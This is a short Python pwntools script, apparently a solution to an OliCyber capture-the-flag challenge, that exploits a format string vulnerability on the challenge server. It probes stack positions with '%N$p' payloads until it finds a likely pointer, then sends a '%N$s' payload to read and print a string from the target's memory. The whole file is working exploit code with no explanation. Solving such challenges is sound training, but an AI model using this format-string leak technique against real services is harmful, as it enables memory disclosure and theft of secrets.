from pwn import *

idx = 0

for i in range(1, 100):
    r = remote('scotti.challs.olicyber.it', 12202)

    r.recvuntil(b'risposta? ')
    r.sendline(b'.. ' + str(f'%{i}$p').encode() + b' ..')
    r.recvuntil(b'..')
    data = r.recvuntil(b'..')
    if b'0x7' in data:
        idx = i + 1
        break
    r.close()

r = remote('scotti.challs.olicyber.it', 12202)

r.recvuntil(b'risposta? ')
r.sendline(f'%{idx}$s!'.encode())
r.recvline()

data = r.recvuntil(b'!')[:-1]
print(data.decode())
